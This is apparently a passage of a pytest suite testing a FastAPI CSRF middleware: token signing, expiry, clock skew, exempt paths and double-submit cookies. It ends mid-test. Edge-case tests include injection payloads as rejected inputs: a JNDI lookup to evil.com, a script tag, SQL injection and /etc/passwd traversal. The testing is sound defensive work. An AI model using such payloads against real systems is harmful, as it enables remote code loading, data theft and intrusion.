"""
Comprehensive Security Tests for CSRF Middleware

Tests the CSRF protection middleware implementation including:
- Token generation and format validation
- Token signature verification (HMAC-SHA256)
- Token expiration handling
- Double Submit Cookie pattern
- Path exemptions
- Clock skew tolerance
- Non-ASCII character rejection
- Constant-time comparison security
- Integration with FastAPI

Security Focus:
- Timing attack resistance
- Token tampering detection
- Replay attack prevention
- XSS/injection resistance
"""

import hmac
import hashlib
import secrets
import time
import os
import sys
import pytest
from unittest.mock import patch, MagicMock
from fastapi import FastAPI, Response
from fastapi.testclient import TestClient


# ============================================================================
# Test Configuration
# ============================================================================

TEST_SECRET_KEY = "test-csrf-secret-key-minimum-32-characters-long!"
VALID_TOKEN_FORMAT_PARTS = 3  # timestamp.random.signature


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def secret_key() -> str:
    """Provide a test secret key for CSRF operations."""
    return TEST_SECRET_KEY


@pytest.fixture
def mock_settings(secret_key):
    """Mock settings with CSRF configuration."""
    mock = MagicMock()
    mock.SECURITY_CSRF_SECRET_KEY = secret_key
    mock.SESSION_ENABLE_COOKIE_SECURE = False
    mock.SESSION_COOKIE_SAMESITE = "strict"
    mock.APP_ENVIRONMENT = "development"
    return mock


@pytest.fixture
def csrf_module(mock_settings, secret_key):
    """Import CSRF module with mocked settings."""
    # Set the environment variable for the CSRF secret key before importing
    os.environ["SECURITY_CSRF_SECRET_KEY"] = secret_key

    # Patch the settings module before importing CSRF
    with patch.dict("sys.modules", {}):
        # Clear any cached imports
        modules_to_remove = [k for k in sys.modules.keys() if 'csrf' in k.lower()]
        for m in modules_to_remove:
            sys.modules.pop(m, None)

    with patch("app.config.settings", mock_settings):
        from app.middleware.csrf import (
            generate_csrf_token,
            validate_csrf_token,
            is_csrf_exempt,
            CSRFMiddleware,
            get_csrf_token,
            set_csrf_cookie,
            EXEMPT_PATHS,
            SAFE_METHODS,
            TOKEN_EXPIRY,
            COOKIE_NAME,
        )
        yield {
            "generate_csrf_token": generate_csrf_token,
            "validate_csrf_token": validate_csrf_token,
            "is_csrf_exempt": is_csrf_exempt,
            "CSRFMiddleware": CSRFMiddleware,
            "get_csrf_token": get_csrf_token,
            "set_csrf_cookie": set_csrf_cookie,
            "EXEMPT_PATHS": EXEMPT_PATHS,
            "SAFE_METHODS": SAFE_METHODS,
            "TOKEN_EXPIRY": TOKEN_EXPIRY,
            "COOKIE_NAME": COOKIE_NAME,
        }


@pytest.fixture
def valid_token(secret_key) -> str:
    """Generate a valid CSRF token for testing."""
    timestamp = str(int(time.time()))
    random_data = secrets.token_hex(32)
    payload = f"{timestamp}.{random_data}"
    signature = hmac.new(
        secret_key.encode("utf-8"),
        payload.encode("utf-8"),
        hashlib.sha256
    ).hexdigest()
    return f"{payload}.{signature}"


@pytest.fixture
def expired_token(secret_key) -> str:
    """Generate an expired CSRF token (2 hours old)."""
    timestamp = str(int(time.time()) - 7200)  # 2 hours ago
    random_data = secrets.token_hex(32)
    payload = f"{timestamp}.{random_data}"
    signature = hmac.new(
        secret_key.encode("utf-8"),
        payload.encode("utf-8"),
        hashlib.sha256
    ).hexdigest()
    return f"{payload}.{signature}"


@pytest.fixture
def future_token(secret_key) -> str:
    """Generate a token with timestamp too far in the future (5 minutes ahead)."""
    timestamp = str(int(time.time()) + 300)  # 5 minutes in future
    random_data = secrets.token_hex(32)
    payload = f"{timestamp}.{random_data}"
    signature = hmac.new(
        secret_key.encode("utf-8"),
        payload.encode("utf-8"),
        hashlib.sha256
    ).hexdigest()
    return f"{payload}.{signature}"


@pytest.fixture
def tampered_token(valid_token) -> str:
    """Generate a token with tampered signature."""
    parts = valid_token.split(".")
    # Change one character in the signature
    tampered_sig = parts[2][:-1] + ("0" if parts[2][-1] != "0" else "1")
    return f"{parts[0]}.{parts[1]}.{tampered_sig}"


@pytest.fixture
def test_app(csrf_module):
    """Create a FastAPI test application with CSRF middleware."""
    app = FastAPI()
    app.add_middleware(csrf_module["CSRFMiddleware"])

    @app.get("/test-get")
    async def test_get():
        return {"status": "ok"}

    @app.post("/test-post")
    async def test_post():
        return {"status": "created"}

    @app.put("/test-put")
    async def test_put():
        return {"status": "updated"}

    @app.delete("/test-delete")
    async def test_delete():
        return {"status": "deleted"}

    @app.get("/health")
    async def health():
        return {"status": "healthy"}

    @app.post("/api/v2/auth/login")
    async def login():
        return {"status": "logged_in"}

    @app.post("/api/v2/webhooks/provider")
    async def provider_webhook():
        return {"status": "accepted"}

    @app.post("/api/public/data")
    async def public_api():
        return {"status": "accepted"}

    @app.get("/csrf-token")
    async def csrf_token_endpoint(response: Response):
        token = csrf_module["get_csrf_token"]()
        csrf_module["set_csrf_cookie"](response, token)
        return {"csrf_token": token}

    return app


@pytest.fixture
def client(test_app):
    """Create TestClient for the test application."""
    return TestClient(test_app)


# ============================================================================
# Test: Token Generation - generate_csrf_token()
# ============================================================================

class TestGenerateCsrfToken:
    """Tests for CSRF token generation function."""

    def test_token_format_three_parts(self, csrf_module, secret_key):
        """Token should have exactly three parts separated by dots."""
        token = csrf_module["generate_csrf_token"](secret_key)
        parts = token.split(".")
        assert len(parts) == 3, f"Token should have 3 parts, got {len(parts)}"

    def test_token_timestamp_is_numeric(self, csrf_module, secret_key):
        """First part (timestamp) should be a valid integer."""
        token = csrf_module["generate_csrf_token"](secret_key)
        timestamp_str = token.split(".")[0]
        assert timestamp_str.isdigit(), "Timestamp should be numeric"
        timestamp = int(timestamp_str)
        assert timestamp > 0, "Timestamp should be positive"

    def test_token_timestamp_is_current(self, csrf_module, secret_key):
        """Timestamp should be within 1 second of current time."""
        before = int(time.time())
        token = csrf_module["generate_csrf_token"](secret_key)
        after = int(time.time())
        timestamp = int(token.split(".")[0])
        assert before <= timestamp <= after, "Timestamp should be current"

    def test_token_random_is_hexadecimal(self, csrf_module, secret_key):
        """Second part (random) should be valid hexadecimal."""
        token = csrf_module["generate_csrf_token"](secret_key)
        random_part = token.split(".")[1]
        try:
            int(random_part, 16)
        except ValueError:
            pytest.fail("Random part should be valid hexadecimal")

    def test_token_random_has_correct_length(self, csrf_module, secret_key):
        """Random part should be 64 hex chars (256 bits entropy)."""
        token = csrf_module["generate_csrf_token"](secret_key)
        random_part = token.split(".")[1]
        assert len(random_part) == 64, f"Random should be 64 chars, got {len(random_part)}"

    def test_token_signature_is_hexadecimal(self, csrf_module, secret_key):
        """Third part (signature) should be valid hexadecimal."""
        token = csrf_module["generate_csrf_token"](secret_key)
        signature = token.split(".")[2]
        try:
            int(signature, 16)
        except ValueError:
            pytest.fail("Signature should be valid hexadecimal")

    def test_token_signature_has_correct_length(self, csrf_module, secret_key):
        """Signature should be 64 hex chars (SHA256 output)."""
        token = csrf_module["generate_csrf_token"](secret_key)
        signature = token.split(".")[2]
        assert len(signature) == 64, f"Signature should be 64 chars, got {len(signature)}"

    def test_token_uniqueness(self, csrf_module, secret_key):
        """Each generated token should be unique."""
        tokens = set()
        for _ in range(100):
            token = csrf_module["generate_csrf_token"](secret_key)
            assert token not in tokens, "Token should be unique"
            tokens.add(token)

    def test_token_uniqueness_parallel_generation(self, csrf_module, secret_key):
        """Tokens generated in rapid succession should still be unique."""
        tokens = [csrf_module["generate_csrf_token"](secret_key) for _ in range(1000)]
        assert len(tokens) == len(set(tokens)), "All tokens should be unique"

    def test_token_signature_validity(self, csrf_module, secret_key):
        """Generated token signature should be verifiable."""
        token = csrf_module["generate_csrf_token"](secret_key)
        parts = token.split(".")
        payload = f"{parts[0]}.{parts[1]}"
        expected_signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        assert parts[2] == expected_signature, "Signature should match HMAC calculation"

    def test_invalid_secret_key_too_short(self, csrf_module):
        """Should raise ValueError for secret key shorter than 32 chars."""
        with pytest.raises(ValueError, match="at least 32 characters"):
            csrf_module["generate_csrf_token"]("short")

    def test_invalid_secret_key_empty(self, csrf_module):
        """Should raise ValueError for empty secret key."""
        with pytest.raises(ValueError, match="at least 32 characters"):
            csrf_module["generate_csrf_token"]("")

    def test_invalid_secret_key_none(self, csrf_module, mock_settings):
        """Should raise ValueError when configured key is None."""
        mock_settings.SECURITY_CSRF_SECRET_KEY = None
        with patch("app.config.settings", mock_settings):
            with pytest.raises(ValueError):
                csrf_module["generate_csrf_token"](None)


# ============================================================================
# Test: Token Validation - validate_csrf_token()
# ============================================================================

class TestValidateCsrfToken:
    """Tests for CSRF token validation function."""

    def test_valid_token_accepted(self, csrf_module, secret_key, valid_token):
        """Valid token should pass validation."""
        assert csrf_module["validate_csrf_token"](valid_token, secret_key) is True

    def test_none_token_rejected(self, csrf_module, secret_key):
        """None token should be rejected."""
        assert csrf_module["validate_csrf_token"](None, secret_key) is False

    def test_empty_string_rejected(self, csrf_module, secret_key):
        """Empty string token should be rejected."""
        assert csrf_module["validate_csrf_token"]("", secret_key) is False

    def test_whitespace_only_rejected(self, csrf_module, secret_key):
        """Whitespace-only token should be rejected."""
        assert csrf_module["validate_csrf_token"]("   ", secret_key) is False
        assert csrf_module["validate_csrf_token"]("\n\t", secret_key) is False

    def test_invalid_format_single_part(self, csrf_module, secret_key):
        """Token with only one part should be rejected."""
        assert csrf_module["validate_csrf_token"]("single", secret_key) is False

    def test_invalid_format_two_parts(self, csrf_module, secret_key):
        """Token with only two parts should be rejected."""
        assert csrf_module["validate_csrf_token"]("part1.part2", secret_key) is False

    def test_invalid_format_four_parts(self, csrf_module, secret_key):
        """Token with four parts should be rejected."""
        assert csrf_module["validate_csrf_token"]("p1.p2.p3.p4", secret_key) is False

    def test_tampered_timestamp_rejected(self, csrf_module, secret_key, valid_token):
        """Token with tampered timestamp should be rejected."""
        parts = valid_token.split(".")
        tampered = f"9999999999.{parts[1]}.{parts[2]}"
        assert csrf_module["validate_csrf_token"](tampered, secret_key) is False

    def test_tampered_random_rejected(self, csrf_module, secret_key, valid_token):
        """Token with tampered random part should be rejected."""
        parts = valid_token.split(".")
        tampered = f"{parts[0]}.{'0' * 64}.{parts[2]}"
        assert csrf_module["validate_csrf_token"](tampered, secret_key) is False

    def test_tampered_signature_rejected(self, csrf_module, secret_key, tampered_token):
        """Token with tampered signature should be rejected."""
        assert csrf_module["validate_csrf_token"](tampered_token, secret_key) is False

    def test_wrong_secret_key_rejected(self, csrf_module, valid_token):
        """Token validated with wrong secret key should be rejected."""
        wrong_key = "different-secret-key-at-least-32-chars"
        assert csrf_module["validate_csrf_token"](valid_token, wrong_key) is False

    def test_non_integer_timestamp_rejected(self, csrf_module, secret_key):
        """Token with non-integer timestamp should be rejected."""
        random_data = secrets.token_hex(32)
        payload = f"not_a_number.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False


# ============================================================================
# Test: Token Expiration
# ============================================================================

class TestTokenExpiration:
    """Tests for CSRF token expiration handling."""

    def test_fresh_token_valid(self, csrf_module, secret_key):
        """Freshly generated token should be valid."""
        token = csrf_module["generate_csrf_token"](secret_key)
        assert csrf_module["validate_csrf_token"](token, secret_key) is True

    def test_expired_token_rejected(self, csrf_module, secret_key, expired_token):
        """Token older than TOKEN_EXPIRY (1 hour) should be rejected."""
        assert csrf_module["validate_csrf_token"](expired_token, secret_key) is False

    def test_token_just_before_expiry_valid(self, csrf_module, secret_key):
        """Token just before expiry (59 minutes) should still be valid."""
        timestamp = str(int(time.time()) - 3540)  # 59 minutes ago
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is True

    def test_token_just_after_expiry_rejected(self, csrf_module, secret_key):
        """Token just after expiry (61 minutes) should be rejected."""
        timestamp = str(int(time.time()) - 3660)  # 61 minutes ago
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_token_at_expiry_boundary(self, csrf_module, secret_key):
        """Token at exactly expiry boundary (3600s) should be rejected."""
        timestamp = str(int(time.time()) - 3601)  # Just over 1 hour
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False


# ============================================================================
# Test: Clock Skew Handling
# ============================================================================

class TestClockSkewHandling:
    """Tests for clock skew tolerance (60 seconds)."""

    def test_token_slightly_in_future_valid(self, csrf_module, secret_key):
        """Token with timestamp slightly in future (30s) should be valid."""
        timestamp = str(int(time.time()) + 30)  # 30 seconds in future
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is True

    def test_token_at_clock_skew_limit_valid(self, csrf_module, secret_key):
        """Token at exactly 60s in future should be valid."""
        timestamp = str(int(time.time()) + 60)  # Exactly at tolerance
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is True

    def test_token_beyond_clock_skew_rejected(self, csrf_module, secret_key, future_token):
        """Token more than 60s in future should be rejected."""
        # future_token is 5 minutes (300s) in future
        assert csrf_module["validate_csrf_token"](future_token, secret_key) is False

    def test_token_just_beyond_clock_skew_rejected(self, csrf_module, secret_key):
        """Token at 61s in future should be rejected."""
        timestamp = str(int(time.time()) + 61)  # Just beyond tolerance
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False


# ============================================================================
# Test: Non-ASCII Character Rejection
# ============================================================================

class TestNonAsciiRejection:
    """Tests for non-ASCII character handling in tokens.

    Note: The CSRF implementation validates ASCII encoding specifically for the
    signature field. Token parts with non-ASCII characters in random/timestamp
    will result in signature mismatch since the expected signature is always
    ASCII hexadecimal.
    """

    def test_unicode_in_signature_rejected(self, csrf_module, secret_key):
        """Token with unicode characters in signature should be rejected.

        The signature field is explicitly checked for ASCII encoding.
        """
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        unicode_sig = "a" * 32 + "\u0100" * 16 + "b" * 15  # Contains non-ASCII
        token = f"{timestamp}.{random_data}.{unicode_sig}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_non_hex_random_part_rejected(self, csrf_module, secret_key):
        """Token with non-hexadecimal random part has mismatched signature.

        Even if the signature is correctly generated, modifying the random part
        will cause signature validation to fail.
        """
        timestamp = str(int(time.time()))
        # Generate a valid token first
        valid_random = secrets.token_hex(32)
        valid_payload = f"{timestamp}.{valid_random}"
        valid_sig = hmac.new(
            secret_key.encode("utf-8"),
            valid_payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()

        # Now tamper with the random part
        tampered_random = "xyz" + valid_random[3:]  # Not valid hex chars
        tampered_token = f"{timestamp}.{tampered_random}.{valid_sig}"
        assert csrf_module["validate_csrf_token"](tampered_token, secret_key) is False

    def test_signature_with_emoji_rejected(self, csrf_module, secret_key):
        """Token with emoji in signature is rejected due to ASCII encoding check."""
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        emoji_sig = "a" * 60 + "\U0001F600"  # Has emoji in signature
        token = f"{timestamp}.{random_data}.{emoji_sig}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_signature_with_cyrillic_rejected(self, csrf_module, secret_key):
        """Token with Cyrillic characters in signature should be rejected."""
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        cyrillic_sig = "a" * 32 + "\u0430" * 32  # Cyrillic 'a' looks like ASCII 'a'
        token = f"{timestamp}.{random_data}.{cyrillic_sig}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_null_byte_in_signature_rejected(self, csrf_module, secret_key):
        """Token with null bytes in signature should be rejected."""
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        null_sig = "a" * 32 + "\x00" * 16 + "b" * 16
        token = f"{timestamp}.{random_data}.{null_sig}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_high_ascii_chars_in_signature_rejected(self, csrf_module, secret_key):
        """Token with high ASCII (128-255) chars in signature should be rejected."""
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        # Use Latin-1 extended characters (above ASCII 127)
        high_ascii_sig = "a" * 32 + "\x80\x81\x82" * 10 + "b" * 2
        token = f"{timestamp}.{random_data}.{high_ascii_sig}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_tampered_payload_signature_mismatch(self, csrf_module, secret_key):
        """Tampering with any part of the payload causes signature mismatch."""
        # Generate a completely valid token
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        valid_token = f"{payload}.{signature}"

        # Verify original is valid
        assert csrf_module["validate_csrf_token"](valid_token, secret_key) is True

        # Modify timestamp slightly
        tampered_timestamp = str(int(timestamp) + 1)
        tampered_token = f"{tampered_timestamp}.{random_data}.{signature}"
        assert csrf_module["validate_csrf_token"](tampered_token, secret_key) is False


# ============================================================================
# Test: Constant-Time Comparison Security
# ============================================================================

class TestConstantTimeComparison:
    """Tests verifying constant-time comparison is used (timing attack resistance)."""

    def test_hmac_compare_digest_used(self, csrf_module):
        """Verify hmac.compare_digest is called for signature comparison."""
        import app.middleware.csrf as csrf_mod

        # The implementation should use hmac.compare_digest
        source_code = csrf_mod.validate_csrf_token.__code__.co_consts
        # Verify the module uses hmac for comparison (indirect check)
        assert "hmac" in dir(csrf_mod), "CSRF module should import hmac"

    def test_timing_attack_resistance_similar_signatures(self, csrf_module, secret_key, valid_token):
        """Token with signature differing by one char should be rejected consistently."""
        parts = valid_token.split(".")
        original_sig = parts[2]

        # Test multiple positions to ensure consistent rejection time
        for i in range(min(10, len(original_sig))):
            new_char = "0" if original_sig[i] != "0" else "1"
            tampered_sig = original_sig[:i] + new_char + original_sig[i+1:]
            tampered_token = f"{parts[0]}.{parts[1]}.{tampered_sig}"
            assert csrf_module["validate_csrf_token"](tampered_token, secret_key) is False

    def test_early_exit_not_exploitable(self, csrf_module, secret_key):
        """Completely wrong signatures should be rejected just like partially wrong ones."""
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"

        # Completely wrong signature
        wrong_sig_complete = "0" * 64
        token1 = f"{payload}.{wrong_sig_complete}"

        # Partially correct signature (first half correct)
        correct_sig = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        wrong_sig_partial = correct_sig[:32] + "0" * 32
        token2 = f"{payload}.{wrong_sig_partial}"

        # Both should be rejected
        assert csrf_module["validate_csrf_token"](token1, secret_key) is False
        assert csrf_module["validate_csrf_token"](token2, secret_key) is False


# ============================================================================
# Test: CSRF Exempt Paths
# ============================================================================

class TestCsrfExemptPaths:
    """Tests for CSRF path exemption logic."""

    def test_safe_methods_exempt(self, csrf_module):
        """GET, HEAD, OPTIONS methods should be exempt."""
        for method in ["GET", "HEAD", "OPTIONS"]:
            assert csrf_module["is_csrf_exempt"]("/any-path", method) is True

    def test_unsafe_methods_not_exempt_by_default(self, csrf_module):
        """POST, PUT, DELETE, PATCH should not be exempt by default."""
        for method in ["POST", "PUT", "DELETE", "PATCH"]:
            assert csrf_module["is_csrf_exempt"]("/random-path", method) is False

    def test_health_endpoint_exempt(self, csrf_module):
        """Health check endpoint should be exempt."""
        assert csrf_module["is_csrf_exempt"]("/health", "POST") is True

    def test_docs_endpoint_exempt(self, csrf_module):
        """API documentation endpoints should be exempt."""
        assert csrf_module["is_csrf_exempt"]("/docs", "POST") is True
        assert csrf_module["is_csrf_exempt"]("/redoc", "POST") is True
        assert csrf_module["is_csrf_exempt"]("/openapi.json", "POST") is True

    def test_csrf_token_endpoint_exempt(self, csrf_module):
        """CSRF token endpoints should be exempt."""
        assert csrf_module["is_csrf_exempt"]("/csrf-token", "POST") is True
        assert csrf_module["is_csrf_exempt"]("/api/v2/auth/csrf-token", "POST") is True

    def test_session_auth_endpoints_not_exempt(self, csrf_module):
        """Browser/session auth endpoints must prove CSRF on unsafe methods."""
        protected_paths = [
            "/api/v2/auth/login",
            "/api/v2/auth/register",
            "/api/v2/auth/refresh",
            "/api/v2/auth/logout",
            "/api/v2/auth/password/reset-request",
            "/api/v2/auth/password/reset-confirm",
        ]
        for path in protected_paths:
            assert csrf_module["is_csrf_exempt"](path, "POST") is False

    def test_webhook_endpoints_exempt(self, csrf_module):
        """Webhook endpoints should be exempt."""
        assert csrf_module["is_csrf_exempt"]("/webhooks/stripe", "POST") is True
        assert csrf_module["is_csrf_exempt"]("/api/v2/webhooks/whatsapp", "POST") is True

    def test_public_api_exempt(self, csrf_module):
        """Public API endpoints should be exempt."""
        assert csrf_module["is_csrf_exempt"]("/api/public/data", "POST") is True

    def test_static_files_exempt(self, csrf_module):
        """Static file paths should be exempt."""
        assert csrf_module["is_csrf_exempt"]("/static/script.js", "POST") is True
        assert csrf_module["is_csrf_exempt"]("/uploads/image.png", "POST") is True

    def test_protected_paths_not_exempt(self, csrf_module):
        """Protected session-backed API paths should not be exempt."""
        assert csrf_module["is_csrf_exempt"]("/api/v2/treatments", "POST") is False
        assert csrf_module["is_csrf_exempt"]("/api/v2/notifications", "POST") is False
        assert csrf_module["is_csrf_exempt"]("/api/v2/users/profile", "PUT") is False
        assert csrf_module["is_csrf_exempt"]("/api/v2/messages", "POST") is False
        assert csrf_module["is_csrf_exempt"]("/api/v2/enhanced-messages", "POST") is False
        assert csrf_module["is_csrf_exempt"]("/api/v2/flows", "POST") is False

    def test_exempt_paths_are_frozen(self, csrf_module):
        """EXEMPT_PATHS should be immutable (frozenset)."""
        assert isinstance(csrf_module["EXEMPT_PATHS"], frozenset)


# ============================================================================
# Test: Double Submit Cookie Pattern
# ============================================================================

class TestDoubleSubmitCookiePattern:
    """Tests for Double Submit Cookie CSRF protection pattern."""

    def test_matching_header_and_cookie_accepted(self, client, valid_token):
        """Request with matching header and cookie tokens should be accepted."""
        response = client.post(
            "/test-post",
            headers={"X-CSRF-Token": valid_token},
            cookies={"csrf_token": valid_token}
        )
        assert response.status_code == 200

    def test_mismatched_tokens_rejected(self, client, valid_token, secret_key):
        """Request with different header and cookie tokens should be rejected."""
        # Generate a different valid token for the cookie
        timestamp = str(int(time.time()))
        random_data = secrets.token_hex(32)
        payload = f"{timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        different_token = f"{payload}.{signature}"

        response = client.post(
            "/test-post",
            headers={"X-CSRF-Token": valid_token},
            cookies={"csrf_token": different_token}
        )
        assert response.status_code == 403
        assert response.json()["error"] == "csrf_mismatch"

    def test_missing_header_rejected(self, client, valid_token):
        """Request with only cookie (no header) should be rejected."""
        response = client.post(
            "/test-post",
            cookies={"csrf_token": valid_token}
        )
        assert response.status_code == 403
        assert response.json()["error"] == "csrf_token_missing"

    def test_missing_cookie_rejected(self, client, valid_token):
        """Request with only header (no cookie) should be rejected."""
        response = client.post(
            "/test-post",
            headers={"X-CSRF-Token": valid_token}
        )
        assert response.status_code == 403
        assert response.json()["error"] == "csrf_cookie_missing"

    def test_alternative_header_x_csrftoken_accepted(self, client, valid_token):
        """X-CSRFToken header (alternative) should be accepted."""
        response = client.post(
            "/test-post",
            headers={"X-CSRFToken": valid_token},
            cookies={"csrf_token": valid_token}
        )
        assert response.status_code == 200

    def test_alternative_header_x_xsrf_token_accepted(self, client, valid_token):
        """X-XSRF-Token header (Angular compatibility) should be accepted."""
        response = client.post(
            "/test-post",
            headers={"X-XSRF-Token": valid_token},
            cookies={"csrf_token": valid_token}
        )
        assert response.status_code == 200

    def test_invalid_header_token_rejected(self, client, valid_token, tampered_token):
        """Invalid header token (valid cookie) should be rejected."""
        response = client.post(
            "/test-post",
            headers={"X-CSRF-Token": tampered_token},
            cookies={"csrf_token": valid_token}
        )
        assert response.status_code == 403
        assert response.json()["error"] == "csrf_token_invalid"

    def test_invalid_cookie_token_rejected(self, client, valid_token, tampered_token):
        """Invalid cookie token (valid header) should be rejected."""
        response = client.post(
            "/test-post",
            headers={"X-CSRF-Token": valid_token},
            cookies={"csrf_token": tampered_token}
        )
        assert response.status_code == 403
        assert response.json()["error"] == "csrf_cookie_invalid"


# ============================================================================
# Test: Integration with FastAPI TestClient
# ============================================================================

class TestFastAPIIntegration:
    """Integration tests with FastAPI TestClient."""

    def test_get_request_no_csrf_required(self, client):
        """GET requests should not require CSRF token."""
        response = client.get("/test-get")
        assert response.status_code == 200

    def test_post_request_requires_csrf(self, client):
        """POST requests to protected paths require CSRF."""
        response = client.post("/test-post")
        assert response.status_code == 403

    def test_put_request_requires_csrf(self, client):
        """PUT requests to protected paths require CSRF."""
        response = client.put("/test-put")
        assert response.status_code == 403

    def test_delete_request_requires_csrf(self, client):
        """DELETE requests to protected paths require CSRF."""
        response = client.delete("/test-delete")
        assert response.status_code == 403

    def test_exempt_path_no_csrf_required(self, client):
        """Provider webhook and public API paths should not require CSRF tokens."""
        response = client.get("/health")
        assert response.status_code == 200

        response = client.post("/api/v2/webhooks/provider")
        assert response.status_code == 200

        response = client.post("/api/public/data")
        assert response.status_code == 200

    def test_browser_auth_path_requires_csrf(self, client, valid_token):
        """Session-creating auth paths are protected by double-submit CSRF."""
        response = client.post("/api/v2/auth/login")
        assert response.status_code == 403
        assert response.json()["error"] == "csrf_token_missing"

        response = client.post(
            "/api/v2/auth/login",
            headers={"X-CSRF-Token": valid_token},
            cookies={"csrf_token": valid_token},
        )
        assert response.status_code == 200

    def test_csrf_token_endpoint_returns_token(self, client):
        """CSRF token endpoint should return valid token."""
        response = client.get("/csrf-token")
        assert response.status_code == 200

        token = response.json().get("csrf_token")
        assert token is not None
        assert len(token.split(".")) == 3

    def test_csrf_token_endpoint_sets_cookie(self, client):
        """CSRF token endpoint should set cookie."""
        response = client.get("/csrf-token")
        assert response.status_code == 200
        assert "csrf_token" in response.cookies

    def test_full_csrf_flow(self, client):
        """Test complete CSRF protection flow."""
        # Step 1: Get CSRF token
        token_response = client.get("/csrf-token")
        assert token_response.status_code == 200

        csrf_token = token_response.json()["csrf_token"]
        csrf_cookie = token_response.cookies.get("csrf_token")

        # Step 2: Make protected request with token
        protected_response = client.post(
            "/test-post",
            headers={"X-CSRF-Token": csrf_token},
            cookies={"csrf_token": csrf_cookie}
        )
        assert protected_response.status_code == 200

    def test_error_response_format(self, client):
        """Error responses should have consistent format."""
        response = client.post("/test-post")

        assert response.status_code == 403
        data = response.json()
        assert "error" in data
        assert "message" in data


# ============================================================================
# Test: Edge Cases and Security Boundaries
# ============================================================================

class TestEdgeCasesAndSecurity:
    """Tests for edge cases and security boundary conditions."""

    def test_extremely_long_token_rejected(self, csrf_module, secret_key):
        """Extremely long token should be handled safely."""
        long_token = "a" * 100000
        assert csrf_module["validate_csrf_token"](long_token, secret_key) is False

    def test_special_characters_in_token_rejected(self, csrf_module, secret_key):
        """Tokens with special characters should be rejected."""
        special_tokens = [
            "1234567890.<script>alert(1)</script>.abcdef",
            "1234567890.${jndi:ldap://evil.com}.abcdef",
            "1234567890.{{7*7}}.abcdef",  # Template injection
            "1234567890.%00.abcdef",  # URL-encoded null byte
        ]
        for token in special_tokens:
            assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_sql_injection_in_token_rejected(self, csrf_module, secret_key):
        """SQL injection attempts in token should be rejected."""
        sqli_token = "1234567890.' OR '1'='1.abcdef"
        assert csrf_module["validate_csrf_token"](sqli_token, secret_key) is False

    def test_path_traversal_in_token_rejected(self, csrf_module, secret_key):
        """Path traversal in token should be rejected."""
        traversal_token = "1234567890.../../../etc/passwd.abcdef"
        assert csrf_module["validate_csrf_token"](traversal_token, secret_key) is False

    def test_integer_type_token_rejected(self, csrf_module, secret_key):
        """Non-string token types should be rejected."""
        assert csrf_module["validate_csrf_token"](12345, secret_key) is False

    def test_list_type_token_rejected(self, csrf_module, secret_key):
        """List type token should be rejected."""
        assert csrf_module["validate_csrf_token"](["token"], secret_key) is False

    def test_dict_type_token_rejected(self, csrf_module, secret_key):
        """Dict type token should be rejected."""
        assert csrf_module["validate_csrf_token"]({"token": "value"}, secret_key) is False

    def test_multiple_dots_in_parts(self, csrf_module, secret_key):
        """Token parts containing dots should be rejected (extra parts)."""
        token = "123.456.789.abc.def"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_negative_timestamp_rejected(self, csrf_module, secret_key):
        """Negative timestamp should be rejected."""
        random_data = secrets.token_hex(32)
        payload = f"-1.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
